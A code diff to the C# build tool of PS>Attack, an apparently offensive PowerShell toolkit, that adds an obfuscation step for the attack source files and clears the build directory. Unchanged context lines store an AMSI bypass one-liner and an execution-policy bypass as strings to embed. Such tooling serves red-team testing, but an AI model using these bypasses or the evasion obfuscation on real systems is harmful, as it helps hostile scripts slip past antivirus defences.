@@ -5,11 +5,12 @@ using System.Linq;
 using System.Text;
 using System.Runtime.Serialization.Json;
 using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Timers;
 using PSAttackBuildTool.Modules;
 using PSAttackBuildTool.Utils;
 using PSAttackBuildTool.PSAttack;
-using System.Diagnostics;
-using System.Timers;
+using PSAttackBuildTool.ObfuscationEngine;
 
 namespace PSAttackBuildTool
 {
@@ -39,6 +40,11 @@ namespace PSAttackBuildTool
             Display display = new Display();
             GeneratedStrings generatedStrings = new GeneratedStrings();
             Random random = new Random();
+
+            // DELETE BUILD DIR
+            display.updateStage("Initializing..");
+            display.updateStatus("Clearing Build Dir: " + PSABTUtils.GetPSAttackBuildToolDir());
+            Directory.Delete(PSABTUtils.GetPSAttackBuildToolDir(), true);
 
             //READ JSON FILE
             display.updateStage("Initializing..");
@@ -75,11 +81,16 @@ namespace PSAttackBuildTool
                 Directory.CreateDirectory(Strings.moduleSrcDir);
             }
 
-
             if (!(Directory.Exists(Strings.obfuscatedScriptsDir)))
             {
                 display.updateStatus("Creating Obfuscated Modules Directory: " + Strings.obfuscatedScriptsDir);
                 Directory.CreateDirectory(Strings.obfuscatedScriptsDir);
+            }
+
+            if (!(Directory.Exists(Strings.obfuscatedSourceDir)))
+            {
+                display.updateStatus("Creating Obfuscated Source Directory: " + Strings.obfuscatedSourceDir);
+                Directory.CreateDirectory(Strings.obfuscatedSourceDir);
             }
 
             // CLEAR OUT OBFUSCATED SCRIPTS DIR
@@ -123,6 +134,7 @@ namespace PSAttackBuildTool
             // PLACE MATTS AMSI BYPASS IN KEYSTORE
             generatedStrings.Store.Add("amsiBypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
             generatedStrings.Store.Add("setExecutionPolicy", "Set-ExecutionPolicy Bypass -Scope Process -Force");
+            generatedStrings.Store.Add("buildDate", DateTime.Now.ToString());
 
             // WRITE KEYS TO CSV
             DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(Dictionary<string, string>));
@@ -158,6 +170,14 @@ namespace PSAttackBuildTool
             //display.updateMessage("");
             //PSABTUtils.BuildSettingsDesignerFile(attack, generatedStrings);
 
+            // OBFUSCATE
+            ObfuscationEngine.ObfuscationEngine engine = new ObfuscationEngine.ObfuscationEngine(generatedStrings);
+            string[] files = Directory.GetFiles(Strings.attackUnzipDir, "*.*", SearchOption.AllDirectories);
+            foreach (string file in files)
+            {
+                engine.ProcessSource(display, file, generatedStrings, attack);
+            }
+            
             // BUILD PS>ATTACK
             Timer timer = new Timer(1200);
             display.updateStatus("Kicking off build");
@@ -165,7 +185,7 @@ namespace PSAttackBuildTool
             display.updateMessage("3.. 2..");
             display.updateMessage("3.. 2.. 1..\n\n\n");
             Console.ForegroundColor = ConsoleColor.Gray;
-            int exitCode = PSABTUtils.BuildPSAttack(attack);
+            int exitCode = PSABTUtils.BuildPSAttack(attack, generatedStrings);
             if (exitCode == 0)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
